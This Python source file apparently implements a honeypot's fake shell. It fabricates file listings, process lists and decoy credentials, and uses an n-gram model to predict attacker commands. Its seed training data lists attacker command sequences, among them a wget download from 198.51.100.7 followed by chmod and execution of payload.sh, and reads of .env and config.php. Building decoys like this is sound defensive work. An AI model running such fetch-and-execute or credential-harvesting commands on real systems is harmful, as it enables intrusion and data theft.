from __future__ import annotations

import json
import os
import random
import re
from collections import Counter, defaultdict
from dataclasses import dataclass
from pathlib import Path


def _tokenize(command: str) -> list[str]:
    return [token for token in command.strip().split() if token]


@dataclass(slots=True)
class ShellState:
    current_dir: str = "/var/www/html"
    hostname: str = "prod-web-02"
    username: str = "www-data"


class SequencePredictor:
    """A lightweight n-gram predictor with a persistent JSON state file."""

    def __init__(self, model_path: Path) -> None:
        self.model_path = model_path
        self.transition_counts: defaultdict[str, Counter[str]] = defaultdict(Counter)
        self.default_counts: Counter[str] = Counter()
        if self.model_path.exists():
            self.load()
        else:
            self.seed_defaults()

    def seed_defaults(self) -> None:
        sample_sequences = [
            ["whoami", "pwd", "ls -la", "cat .env"],
            ["uname -a", "id", "ps aux", "netstat -tulpn"],
            ["cd /tmp", "wget http://198.51.100.7/payload.sh", "chmod +x payload.sh", "./payload.sh"],
            ["ls", "cat config.php", "mysql -u root -p", "exit"],
        ]
        self.fit(sample_sequences)

    def fit(self, sequences: list[list[str]]) -> None:
        for sequence in sequences:
            previous = "<start>"
            for command in sequence:
                normalized = command.strip()
                if not normalized:
                    continue
                self.transition_counts[previous][normalized] += 1
                self.default_counts[normalized] += 1
                previous = normalized

    def predict_next(self, history: list[str]) -> str:
        previous = history[-1] if history else "<start>"
        candidates = self.transition_counts.get(previous) or self.transition_counts["<start>"]
        if not candidates:
            return "whoami"
        return candidates.most_common(1)[0][0]

    def save(self) -> None:
        payload = {
            "transitions": {
                command: dict(counter)
                for command, counter in self.transition_counts.items()
            },
            "defaults": dict(self.default_counts),
        }
        self.model_path.parent.mkdir(parents=True, exist_ok=True)
        self.model_path.write_text(json.dumps(payload, indent=2), encoding="utf-8")

    def load(self) -> None:
        payload = json.loads(self.model_path.read_text(encoding="utf-8"))
        self.transition_counts = defaultdict(Counter)
        for command, counts in payload.get("transitions", {}).items():
            self.transition_counts[command] = Counter(counts)
        self.default_counts = Counter(payload.get("defaults", {}))


class AdaptiveDeceptionEngine:
    def __init__(self, model_path: Path, hostname_seed: str) -> None:
        self.predictor = SequencePredictor(model_path)
        self.hostname_seed = hostname_seed
        self.session_states: dict[str, ShellState] = {}
        self._random = random.Random(1337)
        self._filesystem = {
            "/": [
                "bin", "boot", "dev", "etc", "home", "lib", "media", "mnt",
                "opt", "root", "run", "sbin", "srv", "sys", "tmp", "usr", "var",
            ],
            "/var/www/html": ["app", "backup_2024.zip", "config.php", "index.php", "uploads", ".env"],
            "/home/ubuntu": ["deploy.sh", "notes.txt", "vpn-export.ovpn", ".ssh", ".bash_history"],
            "/root": ["backup.sh", ".bashrc", ".profile"],
            "/tmp": ["cache.lock", "session.dump", "update.bin"],
            "/etc": ["hosts", "passwd", "shadow", "nginx", "ssh", "mysql", "php", "systemd"],
            "/opt": ["backup", "monitor"],
        }

    def train(self, sequences: list[list[str]]) -> None:
        self.predictor.fit(sequences)
        self.predictor.save()

    def get_prompt(self, session_id: str) -> str:
        state = self._ensure_state(session_id)
        return f"{state.username}@{state.hostname}:{state.current_dir}$ "

    def predict_next(self, history: list[str]) -> str:
        return self.predictor.predict_next(history)

    def synthesize_response(self, session_id: str, command: str, history: list[str]) -> str:
        state = self._ensure_state(session_id)
        normalized = command.strip()
        if not normalized:
            return ""

        if normalized.startswith("cd "):
            target = normalized[3:].strip() or "/"
            state.current_dir = self._resolve_path(state.current_dir, target)
            return ""

        if normalized in {"pwd", "cwd"}:
            return state.current_dir
        if normalized in {"whoami", "id -un"}:
            return state.username
        if normalized == "hostname":
            return state.hostname
        if normalized == "id":
            return "uid=33(www-data) gid=33(www-data) groups=33(www-data),27(sudo)"
        if normalized.startswith("uname"):
            return "Linux prod-web-02 5.15.0-97-generic #107-Ubuntu SMP x86_64 GNU/Linux"
        if normalized.startswith("ls"):
            return self._format_listing(state.current_dir)
        if normalized == "dir":
            return self._format_listing(state.current_dir).replace("  ", " ")
        if normalized.startswith("cat "):
            return self._fake_file_contents(normalized[4:].strip(), state.current_dir)
        if normalized.startswith("type "):
            return self._fake_file_contents(normalized[5:].strip(), state.current_dir)
        if normalized.startswith("ps"):
            return "\n".join(
                [
                    "root         1  0.0  0.1  16944  2124 ?        Ss   07:18   0:01 /sbin/init",
                    "www-data   923  0.3  0.8 229184 17412 ?        Ssl  07:19   0:08 php-fpm: pool www",
                    "mysql     1122  0.5  2.1 1629440 43140 ?       Ssl  07:19   0:12 /usr/sbin/mysqld",
                ]
            )
        if normalized.startswith("netstat") or normalized.startswith("ss "):
            return "\n".join(
                [
                    "tcp   LISTEN 0 128 0.0.0.0:22  0.0.0.0:*",
                    "tcp   LISTEN 0 511 0.0.0.0:80  0.0.0.0:*",
                    "tcp   LISTEN 0 128 127.0.0.1:3306 0.0.0.0:*",
                ]
            )
        if normalized.startswith("ifconfig") or normalized.startswith("ip a"):
            return "\n".join(
                [
                    "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500",
                    "        inet 172.31.24.18  netmask 255.255.240.0  broadcast 172.31.31.255",
                    "        ether 02:42:ac:11:00:02  txqueuelen 1000  (Ethernet)",
                ]
            )
        if normalized.startswith("find "):
            return "\n".join(
                [
                    "/var/www/html/config.php",
                    "/var/www/html/app/.env",
                    "/home/ubuntu/deploy.sh",
                    "/root/backup.sh",
                    "/etc/shadow",
                ]
            )
        if normalized.startswith("grep "):
            return "DB_PASSWORD=Prod-Legacy-Only\nAWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\nDB_HOST=127.0.0.1\n"
        if normalized.startswith(("wget ", "curl ")):
            predicted = self.predict_next([*history, normalized])
            leak_hint = (
                "\n# next likely command: {predicted}"
                if self._shell_should_leak_predictions()
                else ""
            )
            return (
                f"HTTP/1.1 200 OK\nContent-Length: 4096\n"
                f"Saved to ./update.bin{leak_hint}"
            )
        if normalized.startswith(("chmod ", "chown ", "touch ", "mkdir ")):
            return ""
        if normalized.startswith("./") or normalized.endswith(".sh"):
            return "Permission denied"
        if normalized in {"exit", "logout", "quit"}:
            return "logout"

        predicted = self.predict_next(history + [normalized])
        leak_hint = (
            f"\n# next likely command: {predicted}"
            if self._shell_should_leak_predictions()
            else ""
        )
        return (
            f"bash: {normalized}: command completed with no visible output{leak_hint}"
        )

    def _ensure_state(self, session_id: str) -> ShellState:
        if session_id not in self.session_states:
            self.session_states[session_id] = ShellState(
                hostname=self.hostname_seed
            )
        return self.session_states[session_id]

    def _shell_should_leak_predictions(self) -> bool:
        """Prediction hints are useful during local demos and training, but in a
        deployed decoy they can make the environment feel engineered.

        Default to off unless the runtime explicitly enables them through
        SENTINELMESH_SHELL_LEAK_PREDICTIONS=1.
        """
        return os.getenv("SENTINELMESH_SHELL_LEAK_PREDICTIONS", "").strip().lower() in {
            "1",
            "true",
            "yes",
            "on",
        }

    def _resolve_path(self, current_dir: str, target: str) -> str:
        if target.startswith("/"):
            normalized = target
        elif target == "..":
            normalized = "/".join(current_dir.rstrip("/").split("/")[:-1]) or "/"
        elif target == ".":
            normalized = current_dir
        else:
            normalized = f"{current_dir.rstrip('/')}/{target}"
        return normalized if normalized in self._filesystem else current_dir

    def _format_listing(self, path: str) -> str:
        contents = self._filesystem.get(path, ["index.php", "config.php"])
        return "\n".join(contents)

    def _fake_file_contents(self, file_name: str, current_dir: str) -> str:
        normalized = self._resolve_file(file_name, current_dir)
        if normalized.endswith("config.php"):
            return "<?php\n$db='payments';\n$user='payments_app';\n$pass='M4rch!2026';\n"
        if normalized.endswith(".env"):
            return "APP_ENV=production\nDB_HOST=127.0.0.1\nDB_PASSWORD=Prod-Legacy-Only\n"
        if normalized.endswith("passwd"):
            return "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin"
        if normalized.endswith("notes.txt"):
            return "Remember to rotate the backup zip after the Q2 release."
        return f"cat: {file_name}: Permission denied"

    def _resolve_file(self, file_name: str, current_dir: str) -> str:
        if file_name.startswith("/"):
            return file_name
        return f"{current_dir.rstrip('/')}/{file_name}"


def extract_sequences(commands: list[str]) -> list[list[str]]:
    sequences: list[list[str]] = []
    current: list[str] = []
    for command in commands:
        if re.match(r"^(exit|logout|quit)$", command.strip()):
            if current:
                sequences.append(current)
            current = []
            continue
        current.append(command.strip())
    if current:
        sequences.append(current)
    return sequences
